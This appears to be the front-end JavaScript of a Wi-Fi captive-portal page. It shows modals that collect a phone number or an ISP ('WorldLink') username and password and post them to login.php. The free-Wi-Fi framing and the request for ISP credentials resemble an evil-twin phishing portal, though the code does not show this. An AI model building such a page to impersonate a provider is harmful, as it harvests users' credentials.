document.addEventListener('DOMContentLoaded', function () {
    const optionsModal = document.getElementById("optionsModal");
    const loginModal   = document.getElementById("loginModal");
    const passwordModal= document.getElementById("passwordModal");
  
    document.getElementById("getOnlineButton").onclick = () => {
      optionsModal.style.display = "block";
    };
    document.getElementById("connectFreeWiFi").onclick = e => {
      e.preventDefault();
      optionsModal.style.display = "none";
      loginModal.style.display   = "block";
    };
    document.getElementById("connectWorldLinkUser").onclick = e => {
      e.preventDefault();
      optionsModal.style.display = "none";
      passwordModal.style.display= "block";
    };
  
    // Close handlers
    Array.from(document.getElementsByClassName("close")).forEach(btn => {
      btn.onclick = () => {
        optionsModal.style.display = loginModal.style.display =
          passwordModal.style.display = "none";
      };
    });
    window.onclick = e => {
      [optionsModal, loginModal, passwordModal].forEach(modal => {
        if (e.target == modal) modal.style.display = "none";
      });
    };
  
    // Phone form XHR
    document.querySelector('.login-form').onsubmit = function (e) {
      e.preventDefault();
      const phone = document.getElementById("phoneNumber").value;
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'login.php', true);
      xhr.setRequestHeader('Content-Type','application/json');
      xhr.onload = () => {
        const resp = JSON.parse(xhr.responseText);
        alert(resp.status==='success'
          ? 'Code has been sent to your phone'
          : resp.message
        );
      };
      xhr.onerror = () => alert('Error sending request.');
      xhr.send(JSON.stringify({ formType:'phone', phone }));
    };
  
    // Password form XHR
    document.getElementById("passwordForm").onsubmit = function (e) {
      e.preventDefault();
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;
      const xhr  = new XMLHttpRequest();
      xhr.open('POST', 'login.php', true);
      xhr.setRequestHeader('Content-Type','application/json');
      xhr.onload = () => {
        const resp = JSON.parse(xhr.responseText);
        const box  = document.getElementById("messageBox");
        box.style.display = "block";
        if (resp.status==='success') {
          box.className = "message-box";
          box.innerHTML = "Connected! Please check your device.";
        } else {
          box.className = "message-box error";
          box.innerHTML = resp.message;
        }
      };
      xhr.onerror = () => {
        const box = document.getElementById("messageBox");
        box.style.display = "block";
        box.className = "message-box error";
        box.innerHTML = "Network error.";
      };
      xhr.send(JSON.stringify({ formType:'credentials', username:user, password:pass }));
    };
  });
  